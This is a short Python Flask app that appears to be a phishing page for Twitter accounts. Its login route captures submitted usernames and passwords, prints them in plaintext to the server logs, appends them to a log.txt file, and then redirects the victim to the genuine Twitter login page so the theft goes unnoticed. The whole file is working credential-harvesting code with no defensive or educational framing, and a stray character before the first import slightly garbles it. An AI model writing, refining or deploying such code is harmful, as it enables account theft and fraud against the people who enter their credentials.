kfrom flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Log to console (this will show in Render logs)
    print(f"{datetime.now()} - Username: {username}, Password: {password}")
    
    # Optional: Log to a file if allowed
    try:
        with open("log.txt", "a") as file:
            file.write(f"{datetime.now()} - Username: {username}, Password: {password}\n")
    except Exception as e:
        print(f"Error writing to log.txt: {e}")

    return redirect("https://twitter.com/login")

if __name__ == "__main__":
    app.run(debug=True)
